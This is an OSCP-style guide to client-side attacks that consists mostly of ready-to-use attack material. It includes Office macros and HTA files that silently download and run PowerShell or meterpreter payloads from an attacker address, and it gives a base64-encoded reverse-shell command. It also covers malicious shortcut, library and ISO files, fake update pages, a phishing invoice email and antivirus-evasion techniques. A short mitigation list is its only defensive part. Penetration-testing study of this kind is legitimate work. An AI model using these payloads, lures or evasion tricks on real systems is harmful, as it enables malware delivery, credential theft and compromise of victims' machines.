# Client-Side Attacks Guide (OSCP)

## Table of Contents
1. [Client-Side Attack Basics](#client-side-attack-basics)
2. [Microsoft Office Macros](#microsoft-office-macros)
3. [HTML Application (HTA)](#html-application-hta)
4. [Windows Library Files](#windows-library-files)
5. [Shortcut Files (.lnk)](#shortcut-files-lnk)
6. [ISO/IMG File Attacks](#isoimg-file-attacks)
7. [PDF Exploits](#pdf-exploits)
8. [Browser Exploits](#browser-exploits)
9. [Social Engineering Delivery](#social-engineering-delivery)
10. [OSCP Scenarios](#oscp-scenarios)

---

## Client-Side Attack Basics

### What are Client-Side Attacks?
Attacks that exploit vulnerabilities or features on the client machine (victim's computer) rather than the server. Require user interaction or social engineering.

### Common Vectors
- **Microsoft Office Documents** (macros)
- **HTML Applications (HTA)**
- **Windows Library Files (.library-ms)**
- **Shortcut Files (.lnk)**
- **ISO/IMG Files**
- **PDF Documents**
- **Browser-based exploits**
- **Email attachments**

### Requirements for OSCP
- Understanding of payload generation
- Basic social engineering
- File format manipulation
- Delivery mechanisms
- Anti-virus evasion basics

---

## Microsoft Office Macros

### VBA Macro Basics

#### Vulnerable Office Versions
- Office 2007-2019 (with macros enabled)
- Office 365

#### Auto-Execute Macros
```vba
' Document open trigger
Sub AutoOpen()
    MyMacro
End Sub

' Word specific
Sub Document_Open()
    MyMacro
End Sub

' Excel specific
Sub Workbook_Open()
    MyMacro
End Sub
```

### Basic PowerShell Execution Macro

#### Simple PowerShell Download & Execute
```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String

    ' PowerShell command
    Str = "powershell.exe -nop -w hidden -c ""IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/payload.ps1')"""

    ' Execute
    Shell Str, vbHide
End Sub
```

### Split String for AV Evasion
```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String

    ' Split command to evade detection
    Str = "power"
    Str = Str + "shell.exe -nop -w hidden -c "
    Str = Str + """IEX(New-Object Net.WebClient)."
    Str = Str + "downloadString('http://10.10.14.5/payload.ps1')"""

    Shell Str, vbHide
End Sub
```

### Base64 Encoded PowerShell Macro
```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String

    ' Base64 encoded PowerShell command
    ' Encode your payload: echo -n "IEX..." | base64
    Str = "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"

    Shell Str, vbHide
End Sub
```

### Meterpreter Macro
```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String

    ' Download and execute meterpreter
    Str = "powershell.exe -nop -w hidden -c ""$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://10.10.14.5/payload.exe','C:\Users\Public\payload.exe'); Start-Process 'C:\Users\Public\payload.exe'"""

    Shell Str, vbHide
End Sub
```

### Create Malicious Document

#### Using MSFVenom
```bash
# Generate payload
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=10.10.14.5 \
    LPORT=443 \
    -f vba

# Output will be VBA code
# Copy into Word/Excel macro editor
```

#### Manual Creation Steps
```
1. Open Microsoft Word
2. View → Macros → Create
3. Paste VBA code
4. Save as .docm or .doc (macro-enabled)
5. Test in isolated environment
6. Deliver to target
```

---

## HTML Application (HTA)

### What is HTA?
HTML Application files execute with full trust in Windows, allowing script execution without browser security restrictions.

### Basic HTA Structure
```html
<!DOCTYPE html>
<html>
<head>
    <title>Security Update</title>
    <HTA:APPLICATION
        id="SecurityUpdate"
        applicationName="Windows Security Update"
        border="thin"
        borderStyle="normal"
        caption="yes"
        maximizeButton="no"
        minimizeButton="no"
        showInTaskbar="no"
        windowState="normal"
        singleInstance="yes"
    />
</head>
<body>
    <h2>Installing Security Update...</h2>
    <p>Please wait while we install the latest security patches.</p>

    <script language="VBScript">
        Dim shell
        Set shell = CreateObject("WScript.Shell")

        ' Execute PowerShell reverse shell
        shell.Run "powershell.exe -nop -w hidden -c ""IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/payload.ps1')""", 0, False

        ' Close HTA window
        window.close()
    </script>
</body>
</html>
```

### PowerShell Download & Execute HTA
```html
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <HTA:APPLICATION id="app" border="none" showInTaskbar="no" />
</head>
<body>
    <script language="VBScript">
        Set objShell = CreateObject("WScript.Shell")

        ' Download and execute payload
        command = "powershell -w hidden -c ""$wc=New-Object System.Net.WebClient;$wc.DownloadFile('http://10.10.14.5/payload.exe','C:\Users\Public\update.exe');Start-Process 'C:\Users\Public\update.exe'"""

        objShell.Run command, 0, False
        window.close()
    </script>
</body>
</html>
```

### Meterpreter HTA
```html
<!DOCTYPE html>
<html>
<head>
    <HTA:APPLICATION id="exploit" />
    <title>Windows Update</title>
</head>
<body>
    <h3>Installing updates...</h3>

    <script language="VBScript">
        Dim shell
        Set shell = CreateObject("WScript.Shell")

        ' Base64 encoded meterpreter payload
        command = "powershell.exe -nop -w hidden -enc <BASE64_PAYLOAD>"

        shell.Run command, 0, False
        window.close()
    </script>
</body>
</html>
```

### Generate HTA with MSFVenom
```bash
# Generate HTA payload
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=10.10.14.5 \
    LPORT=443 \
    -f hta-psh \
    -o update.hta

# Start listener
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 443; exploit"

# Deliver HTA file to victim
```

### HTA Delivery Methods
```
1. Email attachment: "security_update.hta"
2. Download link: http://attacker.com/update.hta
3. Embedded in web page: <a href="evil.hta">Download Update</a>
4. SMB share: \\attacker.com\share\update.hta
5. USB drop
```

---

## Windows Library Files

### What are Library Files?
`.library-ms` files are XML-based shortcuts that specify search locations. Can be weaponized to auto-execute files.

### Malicious Library File
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
    <name>@shell32.dll,-34575</name>
    <version>6</version>
    <isLibraryPinned>true</isLibraryPinned>
    <iconReference>imageres.dll,-1003</iconReference>
    <templateInfo>
        <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
    </templateInfo>
    <searchConnectorDescriptionList>
        <searchConnectorDescription>
            <isDefaultSaveLocation>true</isDefaultSaveLocation>
            <isSupported>false</isSupported>
            <simpleLocation>
                <url>\\10.10.14.5\share</url>
            </simpleLocation>
        </searchConnectorDescription>
    </searchConnectorDescriptionList>
</libraryDescription>
```

**Save as:** `Documents.library-ms`

### SMB Share Setup
```bash
# Create SMB share with malicious file
# When victim opens library, connects to SMB
# Can capture NetNTLM hashes or deliver payload

# Responder
sudo responder -I tun0 -wv

# Or serve malicious DLL/EXE
```

---

## Shortcut Files (.lnk)

### Malicious LNK File Concepts
`.lnk` files can execute commands when opened.

### PowerShell LNK Creation Script
```powershell
# Create malicious shortcut
$wsh = New-Object -ComObject WScript.Shell
$shortcut = $wsh.CreateShortcut("C:\Users\Public\Document.lnk")

# PowerShell reverse shell target
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-nop -w hidden -c ""IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/payload.ps1')"""

# Icon to look legitimate
$shortcut.IconLocation = "C:\Windows\System32\shell32.dll,0"

# Save
$shortcut.Save()
```

### LNK with Embedded Payload
```powershell
# Download and execute payload
$wsh = New-Object -ComObject WScript.Shell
$shortcut = $wsh.CreateShortcut("C:\Temp\Invoice.lnk")

$shortcut.TargetPath = "cmd.exe"
$shortcut.Arguments = "/c powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/payload.exe','C:\Users\Public\update.exe');Start-Process 'C:\Users\Public\update.exe'"""
$shortcut.IconLocation = "%SystemRoot%\System32\shell32.dll,1"
$shortcut.WindowStyle = 7  # Minimized

$shortcut.Save()
```

---

## ISO/IMG File Attacks

### Why ISO Files?
- Bypass Mark of the Web (MotW) in some Windows versions
- Can contain malicious executables
- Users trust ISO files for software installs

### Create Malicious ISO
```bash
# On Linux
# 1. Create directory with payload
mkdir malicious_iso
cd malicious_iso

# 2. Generate payload
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=10.10.14.5 \
    LPORT=443 \
    -f exe \
    -o setup.exe

# 3. Create autorun.inf (optional)
cat > autorun.inf << EOF
[autorun]
open=setup.exe
icon=setup.exe,0
label=Software Installation
EOF

# 4. Create ISO
genisoimage -o software.iso -V "Software" -r -J .

# Or use mkisofs
mkisofs -o software.iso -V "Software" -r -J .

# 5. Deliver to victim
```

### ISO with LNK File
```bash
# Create ISO containing malicious .lnk and hidden .exe
mkdir iso_contents

# Copy malicious executable
cp payload.exe iso_contents/.payload.exe

# Create LNK pointing to hidden exe
# (use PowerShell script from above)

# Create ISO
genisoimage -o document.iso -V "Documents" -r -J iso_contents/
```

---

## PDF Exploits

### PDF with Embedded File Launch
```
Use tools like:
- Adobe Acrobat Pro (embed file, set open action)
- PDFtk
- Custom PDF generators
```

### PDF JavaScript Execution (Outdated)
```javascript
// Older Adobe Reader versions
app.alert("Malicious JavaScript");
```

### Modern PDF Attack: Embedded File + Social Engineering
```
1. Create PDF with embedded .exe or .hta
2. Social engineering: "Click here to view attachment"
3. User extracts and runs embedded file
```

---

## Browser Exploits

### Malicious HTML with Auto-Download
```html
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <h2>Downloading security update...</h2>
    <script>
        // Auto-download payload
        window.location = "http://10.10.14.5/payload.exe";
    </script>
</body>
</html>
```

### Fake Update Page
```html
<!DOCTYPE html>
<html>
<head>
    <title>Browser Update Required</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; }
        .update-box { border: 1px solid #ccc; padding: 30px; margin: 0 auto; width: 500px; }
        .btn { background: #0078d7; color: white; padding: 15px 30px; border: none; cursor: pointer; font-size: 16px; }
    </style>
</head>
<body>
    <div class="update-box">
        <h1>Browser Update Required</h1>
        <p>Your browser is out of date and may be vulnerable to security issues.</p>
        <p>Please download and install the latest update.</p>
        <br>
        <a href="http://10.10.14.5/browser_update.exe">
            <button class="btn">Download Update</button>
        </a>
    </div>
</body>
</html>
```

---

## Social Engineering Delivery

### Email Delivery

#### Attachment Types (Most to Least Effective)
1. **.docm** / **.xlsm** - Macro-enabled Office docs
2. **.hta** - HTML Application
3. **.iso** / **.img** - Disc images
4. **.lnk** - Shortcuts (in .zip)
5. **.pdf** - With embedded files

#### Email Template Example
```
Subject: Urgent: Invoice Payment Required

Dear [Name],

We have not received payment for invoice #12345 dated [date].
Please review the attached invoice and process payment immediately
to avoid late fees.

Attached: Invoice_12345.docm

Best regards,
Accounts Receivable
[Company Name]
```

### SMB Delivery
```bash
# Setup SMB share with Responder
sudo responder -I tun0 -wv

# Or Impacket smbserver
impacket-smbserver share . -smb2support

# Send link to victim
\\10.10.14.5\share\update.exe
```

### USB Drop
```
1. Create payload (HTA, LNK, ISO, etc.)
2. Add autorun.inf (if auto-execution possible)
3. Add README with social engineering
4. Drop USB in target location
```

### Watering Hole
```
1. Compromise or create fake website
2. Host malicious download (fake update, software, etc.)
3. Social engineer target to visit site
4. Deliver payload via download
```

---

## OSCP Scenarios

### Scenario 1: Macro Document via Email
```bash
# Step 1: Generate payload
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=10.10.14.5 \
    LPORT=443 \
    -f vba \
    -o macro.vba

# Step 2: Create Word document with macro
# (Copy VBA code into Word macro editor)
# Save as Invoice.docm

# Step 3: Start listener
msfconsole -q -x "use exploit/multi/handler; \
    set payload windows/meterpreter/reverse_tcp; \
    set LHOST 10.10.14.5; \
    set LPORT 443; \
    exploit"

# Step 4: Send document to target
# Wait for victim to open and enable macros
```

### Scenario 2: HTA Attack via Link
```bash
# Step 1: Create HTA payload
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=10.10.14.5 \
    LPORT=443 \
    -f hta-psh \
    -o update.hta

# Step 2: Host HTA file
python3 -m http.server 80

# Step 3: Start listener
nc -nlvp 443

# Step 4: Send link to target
# Email: "Download security update: http://10.10.14.5/update.hta"
```

### Scenario 3: ISO File Attack
```bash
# Step 1: Generate executable payload
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=10.10.14.5 \
    LPORT=443 \
    -f exe \
    -o setup.exe

# Step 2: Create ISO
mkdir iso
cp setup.exe iso/
genisoimage -o software_install.iso -V "Software" -r -J iso/

# Step 3: Start listener
msfconsole -q -x "use exploit/multi/handler; \
    set payload windows/meterpreter/reverse_tcp; \
    set LHOST 10.10.14.5; \
    set LPORT 443; \
    exploit"

# Step 4: Deliver ISO to target (email, download link, etc.)
```

### Scenario 4: LNK File + SMB Share
```bash
# Step 1: Create malicious LNK (use PowerShell script above)

# Step 2: Host on SMB share
impacket-smbserver share . -smb2support

# Step 3: Start listener
nc -nlvp 443

# Step 4: Send victim path to LNK
# \\10.10.14.5\share\Document.lnk
```

---

## Anti-Virus Evasion Basics

### Obfuscation Techniques

#### String Splitting
```vba
Str = "power" + "shell.exe"
```

#### Base64 Encoding
```bash
# Encode PowerShell payload
echo -n "IEX(New-Object..." | base64

# Use in -enc parameter
powershell.exe -enc <base64>
```

#### Variable Renaming
```vba
' Avoid detection
Dim a As String
Dim b As String
a = "pow"
b = "ershell"
cmd = a + b + ".exe"
```

#### Sleep/Delay
```vba
' Delay execution to bypass sandbox
Application.Wait(Now + TimeValue("00:00:10"))
```

### Testing Against AV
```bash
# Test payload
1. Upload to antiscan.me (private)
2. Test in VM with AV
3. Iterate encoding/obfuscation
4. Avoid VirusTotal (signatures are shared)
```

---

## Detection and Mitigation (For Understanding)

### Defending Against Client-Side Attacks
1. **Disable macros** by default
2. **Application whitelisting** (AppLocker)
3. **Email filtering** (block .hta, .jse, executables)
4. **User training** (phishing awareness)
5. **Endpoint protection** (EDR solutions)
6. **Mark of the Web** (MotW) enforcement

---

## Tools

### Payload Generators
```bash
# MSFVenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f exe

# Macro Pack
git clone https://github.com/sevagas/macro_pack
python3 macro_pack.py -f payload.exe -G malicious.docm

# Lucky Strike (macros)
https://github.com/curi0usJack/luckystrike

# Covenant C2
https://github.com/cobbr/Covenant
```

---

## Quick Reference

### Quick Macro Payload
```vba
Sub AutoOpen()
    Shell "powershell -w hidden -c ""IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/p.ps1')""", vbHide
End Sub
```

### Quick HTA Payload
```html
<script language="VBScript">
CreateObject("WScript.Shell").Run "powershell -w hidden -c ""IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/p.ps1')""", 0
window.close()
</script>
```

### Quick LNK Creation
```powershell
$s=(New-Object -COM WScript.Shell).CreateShortcut("C:\Temp\f.lnk");$s.TargetPath="powershell";$s.Arguments="-w hidden -c IEX(...)";$s.Save()
```

---

## OSCP Exam Tips

1. **Macros are common** - practice creating malicious Office docs
2. **HTA files bypass many protections** - reliable for client-side
3. **Social engineering required** - craft convincing pretexts
4. **Test payloads locally first** - ensure they work before delivery
5. **Combine techniques** - macro → download → execute
6. **Document carefully** - explain social engineering in report
7. **Staged payloads** - download small stager, then full payload
8. **Check for AV** - may need obfuscation

---

**Remember**: Client-side attacks require user interaction. Social engineering and believable pretexts are crucial. Always test ethically with proper authorization!
